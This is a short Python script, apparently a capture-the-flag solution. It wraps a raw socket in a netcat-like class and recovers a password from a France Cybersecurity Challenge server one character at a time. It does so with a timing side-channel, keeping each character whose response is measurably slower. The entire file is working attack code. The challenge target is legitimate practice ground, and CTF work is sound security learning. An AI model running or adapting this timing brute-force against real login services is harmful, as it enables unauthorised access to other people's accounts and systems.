import time
import socket
import string

class Netcat:

    """ Python 'netcat like' module """

    def __init__(self, ip, port):

        self.buff = b""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length = 1024):

        """ Read 1024 bytes off the socket """

        return self.socket.recv(length)
 
    def read_until(self, data):

        """ Read data into the buffer until we have data """

        while not data in self.buff:
            self.buff += self.socket.recv(1024)
 
        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]
 
        return rval
 
    def write(self, data):

        self.socket.send(data)
    
    def close(self):

        self.socket.close()



mdp = ""
waitingTime = 0

for i in range(100):
    for c in string.printable:
        nc = Netcat('challenges2.france-cybersecurity-challenge.fr', 6006)
        nc.read_until(b'mot de passe :')
        a = time.time()
        nc.write((mdp+c).encode() + b'\n')
        reading = nc.read()
        b = time.time()
        if not 'incorrect' in reading.decode() or len(reading) < 3:
            print(reading)
        if b-a > waitingTime + 0.15:
            mdp += c
            waitingTime = b-a
            print(mdp)
            break